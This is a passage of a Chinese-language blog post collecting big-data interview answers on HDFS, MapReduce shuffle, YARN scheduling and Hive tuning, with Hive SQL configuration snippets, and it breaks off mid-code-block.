id="4、NameNode在启动的时候会做哪些操作">4、NameNode在启动的时候会做哪些操作</h3><p>NameNode数据存储在内存和本地磁盘，本地磁盘数据存储在<strong>fsimage镜像文件和edits编辑日志文件</strong>。</p><p><em>首次启动NameNode</em>：</p><ol><li><strong>格式化文件系统，为了生成fsimage镜像文件</strong>；</li><li>启动NameNode：<ul><li>读取fsimage文件，将文件内容加载进内存</li><li>等待DataNade注册与发送block report</li></ul></li><li>启动DataNode：<ul><li>向NameNode注册</li><li>发送block report</li><li>检查fsimage中记录的块的数量和block report中的块的总数是否相同</li></ul></li><li>对文件系统进行操作（创建目录，上传文件，删除文件等）：<ul><li>此时内存中已经有文件系统改变的信息，但是磁盘中没有文件系统改变的信息，此时会将这些改变信息写入edits文件中，edits文件中存储的是文件系统元数据改变的信息。</li></ul></li></ol><p><em>第二次启动NameNode</em>：</p><ol><li>读取fsimage和edits文件；</li><li>将fsimage和edits文件合并成新的fsimage文件；</li><li>创建新的edits文件，内容开始为空；</li><li>启动DataNode。</li></ol><h3 id="5、Secondary-NameNode了解吗，它的工作机制是怎样的">5、Secondary NameNode了解吗，它的工作机制是怎样的</h3><p>Secondary NameNode是合并NameNode的edit logs到fsimage文件中；它的具体工作机制：</p><ol><li>Secondary NameNode询问NameNode是否需要checkpoint。直接带回NameNode是否检查结果；</li><li>Secondary NameNode请求执行checkpoint；</li><li>NameNode滚动正在写的edits日志；</li><li>将滚动前的编辑日志和镜像文件拷贝到Secondary NameNode；</li><li>Secondary NameNode加载编辑日志和镜像文件到内存，并合并；</li><li>生成新的镜像文件fsimage.chkpoint；</li><li>拷贝fsimage.chkpoint到NameNode；</li><li>NameNode将fsimage.chkpoint重新命名成fsimage；</li></ol><p>所以如果NameNode中的元数据丢失，是可以从Secondary NameNode恢复一部分元数据信息的，但不是全部，因为NameNode正在写的edits日志还没有拷贝到Secondary NameNode，这部分恢复不了。</p><h3 id="6、Secondary-NameNode不能恢复NameNode的全部数据，那如何保证NameNode数据存储安全">6、Secondary NameNode不能恢复NameNode的全部数据，那如何保证NameNode数据存储安全</h3><p>这个问题就要说NameNode的高可用了，即 <strong>NameNode HA</strong>。一个NameNode有单点故障的问题，那就配置双NameNode，配置有两个关键点，一是必须要保证这两个NameNode的元数据信息必须要同步的，二是一个NameNode挂掉之后另一个要立马补上。</p><ol><li><strong>元数据信息同步在 HA 方案中采用的是“共享存储”</strong>。每次写文件时，需要将日志同步写入共享存储，这个步骤成功才能认定写文件成功。然后备份节点定期从共享存储同步日志，以便进行主备切换。</li><li>监控NameNode状态采用zookeeper，两个NameNode节点的状态存放在zookeeper中，另外两个NameNode节点分别有一个进程监控程序，实施读取zookeeper中有NameNode的状态，来判断当前的NameNode是不是已经down机。如果Standby的NameNode节点的ZKFC发现主节点已经挂掉，那么就会强制给原本的Active NameNode节点发送强制关闭请求，之后将备用的NameNode设置为Active。</li></ol><blockquote><p><strong>如果面试官再问HA中的 共享存储 是怎么实现的知道吗？<strong>可以进行解释下：NameNode 共享存储方案有很多，比如Linux HA, VMware FT, QJM等，目前社区已经把由Clouderea公司实现的基于QJM（Quorum Journal Manager）的方案合并到HDFS的trunk之中并且作为</strong>默认的共享存储</strong>实现。基于QJM的共享存储系统<strong>主要用于保存EditLog，并不保存FSImage文件</strong>。FSImage文件还是在NameNode的本地磁盘上。QJM共享存储的基本思想来自于Paxos算法，采用多个称为JournalNode的节点组成的JournalNode集群来存储EditLog。每个JournalNode保存同样的EditLog副本。每次NameNode写EditLog的时候，除了向本地磁盘写入 EditLog 之外，也会并行地向JournalNode集群之中的每一个JournalNode发送写请求，只要大多数的JournalNode节点返回成功就认为向JournalNode集群写入EditLog成功。如果有2N+1台JournalNode，那么根据大多数的原则，最多可以容忍有N台JournalNode节点挂掉。</p></blockquote><h3 id="7、在NameNode-HA中，会出现脑裂问题吗？怎么解决脑裂">7、在NameNode HA中，会出现脑裂问题吗？怎么解决脑裂</h3><blockquote><p>假设 NameNode1 当前为 Active 状态，NameNode2 当前为 Standby 状态。如果某一时刻 NameNode1 对应的 ZKFailoverController 进程发生了“假死”现象，那么 Zookeeper 服务端会认为 NameNode1 挂掉了，根据前面的主备切换逻辑，NameNode2 会替代 NameNode1 进入 Active 状态。但是此时 NameNode1 可能仍然处于 Active 状态正常运行，这样 NameNode1 和 NameNode2 都处于 Active 状态，都可以对外提供服务。这种情况称为脑裂。</p></blockquote><p>脑裂对于NameNode这类对数据一致性要求非常高的系统来说是灾难性的，数据会发生错乱且无法恢复。zookeeper社区对这种问题的解决方法叫做 fencing，中文翻译为隔离，也就是想办法把旧的 Active NameNode 隔离起来，使它不能正常对外提供服务。</p><p>在进行 fencing 的时候，会执行以下的操作：</p><ol><li>首先尝试调用这个旧 Active NameNode 的 HAServiceProtocol RPC 接口的 transitionToStandby 方法，看能不能把它转换为 Standby 状态。</li><li>如果 transitionToStandby 方法调用失败，那么就执行 Hadoop 配置文件之中预定义的隔离措施，Hadoop 目前主要提供两种隔离措施，通常会选择 sshfence：<ul><li>sshfence：通过 SSH 登录到目标机器上，执行命令 fuser 将对应的进程杀死；</li><li>shellfence：执行一个用户自定义的 shell 脚本来将对应的进程隔离。</li></ul></li></ol><h3 id="8、小文件过多会有什么危害，如何避免">8、小文件过多会有什么危害，如何避免</h3><p>Hadoop上大量HDFS元数据信息存储在NameNode内存中,因此过多的小文件必定会压垮NameNode的内存。每个元数据对象约占150byte，所以如果有1千万个小文件，每个文件占用一个block，则NameNode大约需要2G空间。如果存储1亿个文件，则NameNode需要20G空间。</p><p>显而易见的解决这个问题的方法就是合并小文件,可以选择在客户端上传时执行一定的策略先合并,或者是使用Hadoop的<code>CombineFileInputFormat&lt;K,V&gt;</code>实现小文件的合并</p><h3 id="9、请说下HDFS的组织架构">9、请说下HDFS的组织架构</h3><ol><li><strong>Client</strong>：客户端<ul><li>切分文件。文件上传HDFS的时候，Client将文件切分成一个一个的Block，然后进行存储</li><li>与NameNode交互，获取文件的位置信息</li><li>与DataNode交互，读取或者写入数据</li><li>Client提供一些命令来管理HDFS，比如启动关闭HDFS、访问HDFS目录及内容等</li></ul></li><li><strong>NameNode</strong>：名称节点，也称主节点，存储数据的元数据信息，不存储具体的数据<ul><li>管理HDFS的名称空间</li><li>管理数据块（Block）映射信息</li><li>配置副本策略</li><li>处理客户端读写请求</li></ul></li><li><strong>DataNode</strong>：数据节点，也称从节点。NameNode下达命令，DataNode执行实际的操作<ul><li>存储实际的数据块</li><li>执行数据块的读/写操作</li></ul></li><li><strong>Secondary NameNode</strong>：并非NameNode的热备。当NameNode挂掉的时候，它并不能马上替换NameNode并提供服务<ul><li>辅助NameNode，分担其工作量</li><li>定期合并Fsimage和Edits，并推送给NameNode</li><li>在紧急情况下，可辅助恢复NameNode</li></ul></li></ol><h3 id="10、请说下MR中Map-Task的工作机制">10、请说下MR中Map Task的工作机制</h3><p><strong>简单概述</strong>：</p><p>inputFile通过split被切割为多个split文件，通过Record按行读取内容给map（自己写的处理逻辑的方法） ，数据被map处理完之后交给OutputCollect收集器，对其结果key进行分区（默认使用的hashPartitioner），然后写入buffer，<strong>每个map task 都有一个内存缓冲区</strong>（环形缓冲区），存放着map的输出结果，当缓冲区快满的时候需要将缓冲区的数据以一个临时文件的方式溢写到磁盘，当整个map task 结束后再对磁盘中这个maptask产生的所有临时文件做合并，生成最终的正式输出文件，然后等待reduce task的拉取。</p><p><strong>详细步骤</strong>：</p><ol><li>读取数据组件 InputFormat (默认 TextInputFormat) 会通过 getSplits 方法对输入目录中的文件进行逻辑切片规划得到 block，有多少个 block就对应启动多少个 MapTask。</li><li>将输入文件切分为 block 之后，由 RecordReader 对象 (默认是LineRecordReader) 进行读取，以 \n 作为分隔符, 读取一行数据, 返回 &lt;key，value&gt;， Key 表示每行首字符偏移值，Value 表示这一行文本内容。</li><li>读取 block 返回 &lt;key,value&gt;, 进入用户自己继承的 Mapper 类中，执行用户重写的 map 函数，RecordReader 读取一行这里调用一次。</li><li>Mapper 逻辑结束之后，将 Mapper 的每条结果通过 context.write 进行collect数据收集。在 collect 中，会先对其进行分区处理，默认使用 HashPartitioner。</li><li><strong>接下来，会将数据写入内存，内存中这片区域叫做环形缓冲区(默认100M)，缓冲区的作用是 批量收集 Mapper 结果，减少磁盘 IO 的影响。我们的 Key/Value 对以及 Partition 的结果都会被写入缓冲区。当然，写入之前，Key 与 Value 值都会被序列化成字节数组</strong>。</li><li>当环形缓冲区的数据达到溢写比列(默认0.8)，也就是80M时，溢写线程启动，<strong>需要对这 80MB 空间内的 Key 做排序 (Sort)</strong>。排序是 MapReduce 模型默认的行为，这里的排序也是对序列化的字节做的排序。</li><li>合并溢写文件，每次溢写会在磁盘上生成一个临时文件 (写之前判断是否有 Combiner)，如果 Mapper 的输出结果真的很大，有多次这样的溢写发生，磁盘上相应的就会有多个临时文件存在。当整个数据处理结束之后开始对磁盘中的临时文件进行 Merge 合并，因为最终的文件只有一个写入磁盘，并且为这个文件提供了一个索引文件，以记录每个reduce对应数据的偏移量</li></ol><h3 id="11、请说下MR中Reduce-Task的工作机制">11、请说下MR中Reduce Task的工作机制</h3><p><strong>简单描述</strong>：</p><p>Reduce 大致分为 copy、sort、reduce 三个阶段，重点在前两个阶段。copy 阶段包含一个 eventFetcher 来获取已完成的 map 列表，由 Fetcher 线程去 copy 数据，在此过程中会启动两个 merge 线程，分别为 inMemoryMerger 和 onDiskMerger，分别将内存中的数据 merge 到磁盘和将磁盘中的数据进行 merge。待数据 copy 完成之后，copy 阶段就完成了。</p><p>开始进行 sort 阶段，sort 阶段主要是执行 finalMerge 操作，纯粹的 sort 阶段，完成之后就是 reduce 阶段，调用用户定义的 reduce 函数进行处理。</p><p><strong>详细步骤</strong>：</p><ol><li><p><strong>Copy阶段</strong>：简单地拉取数据。Reduce进程启动一些数据copy线程(Fetcher)，通过HTTP方式请求maptask获取属于自己的文件（map task 的分区会标识每个map task属于哪个reduce task ，默认reduce task的标识从0开始）。</p></li><li><p><strong>Merge阶段</strong>：在远程拷贝数据的同时，ReduceTask启动了两个后台线程对内存和磁盘上的文件进行合并，以防止内存使用过多或磁盘上文件过多。</p><p>merge有三种形式：内存到内存；内存到磁盘；磁盘到磁盘。默认情况下第一种形式不启用。当内存中的数据量到达一定阈值，就直接启动内存到磁盘的merge。与map端类似，这也是溢写的过程，这个过程中如果你设置有Combiner，也是会启用的，然后在磁盘中生成了众多的溢写文件。内存到磁盘的merge方式一直在运行，直到没有map端的数据时才结束，然后启动第三种磁盘到磁盘的merge方式生成最终的文件。</p></li><li><p><strong>合并排序</strong>：把分散的数据合并成一个大的数据后，还会再对合并后的数据排序。</p></li><li><p><strong>对排序后的键值对调用reduce方法</strong>：键相等的键值对调用一次reduce方法，每次调用会产生零个或者多个键值对，最后把这些输出的键值对写入到HDFS文件中</p></li></ol><h3 id="12、请说下MR中Shuffle阶段">12、请说下MR中Shuffle阶段</h3><p>shuffle阶段分为四个步骤：依次为：分区，排序，规约，分组，其中前三个步骤在map阶段完成，最后一个步骤在reduce阶段完成。shuffle 是 Mapreduce 的核心，它分布在 Mapreduce 的 map 阶段和 reduce 阶段。一般把从 Map 产生输出开始到 Reduce 取得数据作为输入之前的过程称作 shuffle。</p><ol><li><strong>Collect阶段</strong>：将 MapTask 的结果输出到默认大小为 100M 的环形缓冲区，保存的是 key/value，Partition 分区信息等。</li><li><strong>Spill阶段</strong>：当内存中的数据量达到一定的阀值的时候，就会将数据写入本地磁盘，在将数据写入磁盘之前需要对数据进行一次排序的操作，如果配置了 combiner，还会将有相同分区号和 key 的数据进行排序。</li><li><strong>MapTask阶段的Merge</strong>：把所有溢出的临时文件进行一次合并操作，以确保一个 MapTask 最终只产生一个中间数据文件。</li><li><strong>Copy阶段</strong>：ReduceTask 启动 Fetcher 线程到已经完成 MapTask 的节点上复制一份属于自己的数据，这些数据默认会保存在内存的缓冲区中，当内存的缓冲区达到一定的阀值的时候，就会将数据写到磁盘之上。</li><li><strong>ReduceTask阶段的Merge</strong>：在 ReduceTask 远程复制数据的同时，会在后台开启两个线程对内存到本地的数据文件进行合并操作。</li><li><strong>Sort阶段</strong>：在对数据进行合并的同时，会进行排序操作，由于 MapTask 阶段已经对数据进行了局部的排序，ReduceTask 只需保证 Copy 的数据的最终整体有效性即可。</li></ol><blockquote><p>Shuffle 中的缓冲区大小会影响到 mapreduce 程序的执行效率，原则上说，缓冲区越大，磁盘io的次数越少，执行速度就越快。缓冲区的大小可以通过参数调整, 参数：<code>mapreduce.task.io.sort.mb</code> 默认100M</p></blockquote><h3 id="13、Shuffle阶段的数据压缩机制了解吗">13、Shuffle阶段的数据压缩机制了解吗</h3><p>在shuffle阶段，可以看到数据通过大量的拷贝，从map阶段输出的数据，都要通过网络拷贝，发送到reduce阶段，这一过程中，涉及到大量的网络IO，如果数据能够进行压缩，那么数据的发送量就会少得多。</p><p>hadoop当中支持的压缩算法：gzip、bzip2、LZO、LZ4、<strong>Snappy</strong>，这几种压缩算法综合压缩和解压缩的速率，谷歌的Snappy是最优的，一般都选择Snappy压缩。谷歌出品，必属精品。</p><h3 id="14、在写MR时，什么情况下可以使用规约">14、在写MR时，什么情况下可以使用规约</h3><p>规约（combiner）是不能够影响任务的运行结果的局部汇总，适用于求和类，不适用于求平均值，如果reduce的输入参数类型和输出参数的类型是一样的，则规约的类可以使用reduce类，只需要在驱动类中指明规约的类即可</p><h3 id="15、YARN集群的架构和工作原理知道多少">15、YARN集群的架构和工作原理知道多少</h3><p>YARN的基本设计思想是将MapReduce V1中的JobTracker拆分为两个独立的服务：ResourceManager和ApplicationMaster。</p><p>ResourceManager负责整个系统的资源管理和分配，ApplicationMaster负责单个应用程序的的管理。</p><ol><li><strong>ResourceManager</strong>： RM是一个全局的资源管理器，负责整个系统的资源管理和分配，它主要由两个部分组成：调度器（Scheduler）和应用程序管理器（Application Manager）。</li></ol><p>调度器根据容量、队列等限制条件，将系统中的资源分配给正在运行的应用程序，在保证容量、公平性和服务等级的前提下，优化集群资源利用率，让所有的资源都被充分利用应用程序管理器负责管理整个系统中的所有的应用程序，包括应用程序的提交、与调度器协商资源以启动ApplicationMaster、监控ApplicationMaster运行状态并在失败时重启它。</p><ol><li><strong>ApplicationMaster</strong>： 用户提交的一个应用程序会对应于一个ApplicationMaster，它的主要功能有：<ul><li>与RM调度器协商以获得资源，资源以Container表示。</li><li>将得到的任务进一步分配给内部的任务。</li><li>与NM通信以启动/停止任务。</li><li>监控所有的内部任务状态，并在任务运行失败的时候重新为任务申请资源以重启任务。</li></ul></li><li><strong>NodeManager</strong>： NodeManager是每个节点上的资源和任务管理器，一方面，它会定期地向RM汇报本节点上的资源使用情况和各个Container的运行状态；另一方面，他接收并处理来自AM的Container启动和停止请求。</li><li><strong>Container</strong>： Container是YARN中的资源抽象，封装了各种资源。<strong>一个应用程序会分配一个Container，这个应用程序只能使用这个Container中描述的资源</strong>。不同于MapReduceV1中槽位slot的资源封装，Container是一个动态资源的划分单位，更能充分利用资源。</li></ol><h3 id="16、YARN的任务提交流程是怎样的">16、YARN的任务提交流程是怎样的</h3><p>当jobclient向YARN提交一个应用程序后，YARN将分两个阶段运行这个应用程序：一是启动ApplicationMaster;第二个阶段是由ApplicationMaster创建应用程序，为它申请资源，监控运行直到结束。 具体步骤如下:</p><ol><li>用户向YARN提交一个应用程序，并指定ApplicationMaster程序、启动ApplicationMaster的命令、用户程序。</li><li>RM为这个应用程序分配第一个Container，并与之对应的NM通讯，要求它在这个Container中启动应用程序ApplicationMaster。</li><li>ApplicationMaster向RM注册，然后拆分为内部各个子任务，为各个内部任务申请资源，并监控这些任务的运行，直到结束。</li><li>AM采用轮询的方式向RM申请和领取资源。</li><li>RM为AM分配资源，以Container形式返回。</li><li>AM申请到资源后，便与之对应的NM通讯，要求NM启动任务。</li><li>NodeManager为任务设置好运行环境，将任务启动命令写到一个脚本中，并通过运行这个脚本启动任务。</li><li>各个任务向AM汇报自己的状态和进度，以便当任务失败时可以重启任务。</li><li>应用程序完成后，ApplicationMaster向ResourceManager注销并关闭自己</li></ol><h3 id="17、YARN的资源调度三种模型了解吗">17、YARN的资源调度三种模型了解吗</h3><p>在Yarn中有三种调度器可以选择：FIFO Scheduler ，Capacity Scheduler，Fair Scheduler。Apache版本的hadoop默认使用的是Capacity Scheduler调度方式。CDH版本的默认使用的是Fair Scheduler调度方式</p><p><strong>FIFO Scheduler</strong>（先来先服务）：</p><p>FIFO Scheduler把应用按提交的顺序排成一个队列，这是一个先进先出队列，在进行资源分配的时候，先给队列中最头上的应用进行分配资源，待最头上的应用需求满足后再给下一个分配，以此类推。</p><p>FIFO Scheduler是最简单也是最容易理解的调度器，也不需要任何配置，但它并不适用于共享集群。大的应用可能会占用所有集群资源，这就导致其它应用被阻塞，比如有个大任务在执行，占用了全部的资源，再提交一个小任务，则此小任务会一直被阻塞。</p><p><strong>Capacity Scheduler</strong>（能力调度器）：</p><p>对于Capacity调度器，有一个专门的队列用来运行小任务，但是为小任务专门设置一个队列会预先占用一定的集群资源，这就导致大任务的执行时间会落后于使用FIFO调度器时的时间。</p><p><strong>Fair Scheduler</strong>（公平调度器）：</p><p>在Fair调度器中，我们不需要预先占用一定的系统资源，Fair调度器会为所有运行的job动态的调整系统资源。比如：当第一个大job提交时，只有这一个job在运行，此时它获得了所有集群资源；当第二个小任务提交后，Fair调度器会分配一半资源给这个小任务，让这两个任务公平的共享集群资源。</p><p>需要注意的是，在Fair调度器中，从第二个任务提交到获得资源会有一定的延迟，因为它需要等待第一个任务释放占用的Container。小任务执行完成之后也会释放自己占用的资源，大任务又获得了全部的系统资源。最终的效果就是Fair调度器即得到了高的资源利用率又能保证小任务及时完成</p><h1>二、Hive大厂面试题</h1><h3 id="1、hive内部表和外部表的区别">1、hive内部表和外部表的区别</h3><blockquote><p>未被external修饰的是内部表，被external修饰的为外部表</p></blockquote><p><strong>区别</strong>：</p><ol><li>内部表数据由Hive自身管理，外部表数据由HDFS管理；</li><li>内部表数据存储的位置是<code>hive.metastore.warehouse.dir</code>（默认：<code>/user/hive/warehouse</code>），外部表数据的存储位置由自己制定（如果没有LOCATION，Hive将在HDFS上的<code>/user/hive/warehouse</code>文件夹下以外部表的表名创建一个文件夹，并将属于这个表的数据存放在这里）；</li><li><strong>删除内部表会直接删除元数据（metadata）及存储数据；删除外部表仅仅会删除元数据，HDFS上的文件并不会被删除</strong>。</li></ol><h3 id="2、Hive有索引吗">2、Hive有索引吗</h3><p>Hive支持索引（3.0版本之前），但是Hive的索引与关系型数据库中的索引并不相同，比如，Hive不支持主键或者外键。并且Hive索引提供的功能很有限，效率也并不高，因此Hive索引很少使用。</p><ul><li>索引适用的场景：</li></ul><p>适用于不更新的静态字段。以免总是重建索引数据。每次建立、更新数据后，都要重建索引以构建索引表。</p><ul><li>Hive索引的机制如下：</li></ul><p>hive在指定列上建立索引，会产生一张索引表（Hive的一张物理表），里面的字段包括：索引列的值、该值对应的HDFS文件路径、该值在文件中的偏移量。Hive 0.8版本后引入bitmap索引处理器，这个处理器适用于去重后，值较少的列（例如，某字段的取值只可能是几个枚举值） 因为索引是用空间换时间，索引列的取值过多会导致建立bitmap索引表过大。</p><p><strong>注意</strong>：Hive中每次有数据时需要及时更新索引，相当于重建一个新表，否则会影响数据查询的效率和准确性，<strong>Hive官方文档已经明确表示Hive的索引不推荐被使用，在新版本的Hive中已经被废弃了</strong>。</p><p><strong>扩展</strong>：Hive是在0.7版本之后支持索引的，在0.8版本后引入bitmap索引处理器，在3.0版本开始移除索引的功能，取而代之的是2.3版本开始的物化视图，自动重写的物化视图替代了索引的功能。</p><h3 id="3、运维如何对hive进行调度">3、运维如何对hive进行调度</h3><ol><li>将hive的sql定义在脚本当中；</li><li>使用azkaban或者oozie进行任务的调度；</li><li>监控任务调度页面</li></ol><h3 id="4、ORC、Parquet等列式存储的优点">4、ORC、Parquet等列式存储的优点</h3><p>ORC和Parquet都是高性能的存储方式，这两种存储格式总会带来存储和性能上的提升。</p><p><strong>Parquet</strong>:</p><ol><li>Parquet支持嵌套的数据模型，类似于Protocol Buffers，每一个数据模型的schema包含多个字段，每一个字段有三个属性：重复次数、数据类型和字段名。  重复次数可以是以下三种：required(只出现1次)，repeated(出现0次或多次)，optional(出现0次或1次)。每一个字段的数据类型可以分成两种： group(复杂类型)和primitive(基本类型)。</li><li>Parquet中没有Map、Array这样的复杂数据结构，但是可以通过repeated和group组合来实现的。</li><li>由于Parquet支持的数据模型比较松散，可能一条记录中存在比较深的嵌套关系，如果为每一条记录都维护一个类似的树状结可能会占用较大的存储空间，因此Dremel论文中提出了一种高效的对于嵌套数据格式的压缩算法：Striping/Assembly算法。通过Striping/Assembly算法，parquet可以使用较少的存储空间表示复杂的嵌套格式，并且通常Repetition level和Definition level都是较小的整数值，可以通过RLE算法对其进行压缩，进一步降低存储空间。</li><li>Parquet文件是以二进制方式存储的，是不可以直接读取和修改的，Parquet文件是自解析的，文件中包括该文件的数据和元数据。</li></ol><p><strong>ORC</strong>:</p><ol><li>ORC文件是自描述的，它的元数据使用Protocol Buffers序列化，并且文件中的数据尽可能的压缩以降低存储空间的消耗。</li><li>和Parquet类似，ORC文件也是以二进制方式存储的，所以是不可以直接读取，ORC文件也是自解析的，它包含许多的元数据，这些元数据都是同构ProtoBuffer进行序列化的。</li><li>ORC会尽可能合并多个离散的区间尽可能的减少I/O次数。</li><li>ORC中使用了更加精确的索引信息，使得在读取数据时可以指定从任意一行开始读取，更细粒度的统计信息使得读取ORC文件跳过整个row group，ORC默认会对任何一块数据和索引信息使用ZLIB压缩，因此ORC文件占用的存储空间也更小。</li><li>在新版本的ORC中也加入了对Bloom Filter的支持，它可以进一 步提升谓词下推的效率，在Hive 1.2.0版本以后也加入了对此的支 持。</li></ol><h3 id="5、数据建模用的哪些模型？">5、数据建模用的哪些模型？</h3><ul><li>星型模型</li><li> 雪花模型</li><li>星座模型</li></ul><h3 id="6、为什么要对数据仓库分层？">6、为什么要对数据仓库分层？</h3><ul><li><strong>用空间换时间</strong>，通过大量的预处理来提升应用系统的用户体验（效率），因此数据仓库会存在大量冗余的数据。</li><li>如果不分层的话，如果源业务系统的业务规则发生变化将会影响整个数据清洗过程，工作量巨大。</li><li><strong>通过数据分层管理可以简化数据清洗的过程</strong>，因为把原来一步的工作分到了多个步骤去完成，相当于把一个复杂的工作拆成了多个简单的工作，把一个大的黑盒变成了一个白盒，每一层的处理逻辑都相对简单和容易理解，这样我们比较容易保证每一个步骤的正确性，当数据发生错误的时候，往往我们只需要局部调整某个步骤即可。</li></ul><h3 id="7、使用过Hive解析JSON串吗">7、使用过Hive解析JSON串吗</h3><p><strong>Hive处理json数据总体来说有两个方向的路走</strong>：</p><ol><li>将json以字符串的方式整个入Hive表，然后通过使用UDF函数解析已经导入到hive中的数据，比如使用<code>LATERAL VIEW json_tuple</code>的方法，获取所需要的列名。</li><li>在导入之前将json拆成各个字段，导入Hive表的数据是已经解析过的。这将需要使用第三方的 SerDe。</li></ol><h3 id="8、sort-by-和-order-by-的区别">8、sort by 和 order by 的区别</h3><p><strong>order by 会对输入做全局排序，因此只有一个reducer</strong>（多个reducer无法保证全局有序）只有一个reducer，会导致当输入规模较大时，需要较长的计算时间。</p><p>sort by不是全局排序，其在数据进入reducer前完成排序. 因此，如果用sort by进行排序，并且设置mapred.reduce.tasks&gt;1， 则<strong>sort by只保证每个reducer的输出有序，不保证全局有序</strong>。</p><h3 id="9、数据倾斜怎么解决">9、数据倾斜怎么解决</h3><p>数据倾斜问题主要有以下几种：</p><ol><li>空值引发的数据倾斜</li><li>不同数据类型引发的数据倾斜</li><li>不可拆分大文件引发的数据倾斜</li><li>数据膨胀引发的数据倾斜</li><li>表连接时引发的数据倾斜</li><li>确实无法减少数据量引发的数据倾斜</li></ol><p>以上倾斜问题的具体解决方案可查看：<a href="https://mp.weixin.qq.com/s/hz_6io_ZybbOlmBQE4KSBQ" target="_blank" rel="noopener" title="Hive千亿级数据倾斜解决方案(opens new window)">Hive千亿级数据倾斜解决方案(opens new window)</a></p><p><strong>注意</strong>：对于 left join 或者 right join 来说，不会对关联的字段自动去除null值，对于 inner join 来说，会对关联的字段自动去除null值。</p><h3 id="10、Hive-小文件过多怎么解决">10、Hive 小文件过多怎么解决</h3><ul><li><strong>使用 hive 自带的 concatenate 命令，自动合并小文件</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对于非分区表</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> A concatenate;</span><br><span class="line"></span><br><span class="line"><span class="comment">#对于分区表</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> B <span class="keyword">partition</span>(<span class="keyword">day</span>=<span class="number">20201224</span>) concatenate;</span><br><span class="line"></span><br><span class="line"><span class="comment"># concatenate 命令只支持 RCFILE 和 ORC 文件类型</span></span><br><span class="line"><span class="comment"># 使用concatenate命令合并小文件时不能指定合并后的文件数量，但可以多次执行该命令</span></span><br><span class="line"><span class="comment"># 当多次使用concatenate后文件数量不在变化，这个跟参数mapreduce.input.fileinputformat.split.minsize=256mb 的设置有关，可设定每个文件的最小size</span></span><br></pre></td></tr></table></figure><ul><li><strong>调整参数减少Map数量</strong></li></ul><p>设置map输入合并小文件的相关参数（执行Map前进行小文件合并）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在mapper中将多个文件合成一个split作为输入（CombineHiveInputFormat底层是Hadoop的CombineFileInputFormat方法）</span></span><br><span class="line"><span class="keyword">set</span> hive.input.format=org.apache.hadoop.hive.ql.io.CombineHiveInputFormat; <span class="comment">-- 默认</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个Map最大输入大小（这个值决定了合并后文件的数量）</span></span><br><span class="line"><span class="keyword">set</span> mapred.max.split.size=<span class="number">256000000</span>;   <span class="comment">-- 256M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个节点上split的至少大小（这个值决定了多个DataNode上的文件是否需要合并）</span></span><br><span class="line"><span class="keyword">set</span> mapred.min.split.size.per.node=<span class="number">100000000</span>;  <span class="comment">-- 100M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个交换机下split的至少大小(这个值决定了多个交换机上的文件是否需要合并)</span></span><br><span class="line"><span class="keyword">set</span> mapred.min.split.size.per.rack=<span class="number">100000000</span>;  <span class="comment">-- 100M</span></span><br></pre></td></tr></table></figure><ul><li><strong>减少Reduce的数量</strong></li></ul><p>reduce 的个数决定了输出的文件的个数，所以可以调整reduce的个数控制hive表的文件数量。hive中的分区函数 distribute by 正好是控制MR中partition分区的，可以通过设置reduce的数量，结合分区函数让数据均衡的进入每个reduce即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置reduce的数量有两种方式，第一种是直接设置reduce个数</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces=<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种是设置每个reduce的大小，Hive会根据数据总大小猜测确定一个reduce个数</span></span><br><span class="line"><span class="keyword">set</span> hive.exec.reducers.bytes.per.reducer=<span class="number">5120000000</span>; <span class="comment">-- 默认是1G，设置为5G</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行以下语句，将数据均衡的分配到reduce中</span></span><br><span class="line"><span class="keyword">set</span> mapreduce.job.reduces=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> A <span class="keyword">partition</span>(dt)</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> B</span><br><span class="line"><span class="keyword">distribute</span> <span class="keyword">by</span> <span class="keyword">rand</span>();</span><br></pre></td></tr></table></figure><p>对于上述语句解释：如设置reduce数量为10，使用 rand()， 随机生成一个数 <code>x % 10</code> ， 这样数据就会随机进入 reduce 中，防止出现有的文件过大或过小</p><ul><li><strong>使用hadoop的archive将小文件归档</strong></li></ul><p>Hadoop Archive简称HAR，是一个高效地将小文件放入HDFS块中的文件存档工具，它能够将多个小文件打包成一个HAR文件，这样在减少namenode内存使用的同时，仍然允许对文件进行透明的访问。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来控制归档是否可用</span></span><br><span class="line"><span class="keyword">set</span> hive.archive.enabled=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">#通知Hive在创建归档时是否可以设置父目录</span></span><br><span class="line"><span class="keyword">set</span> hive.archive.har.parentdir.settable=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">#控制需要归档文件的大小</span></span><br><span class="line"><span 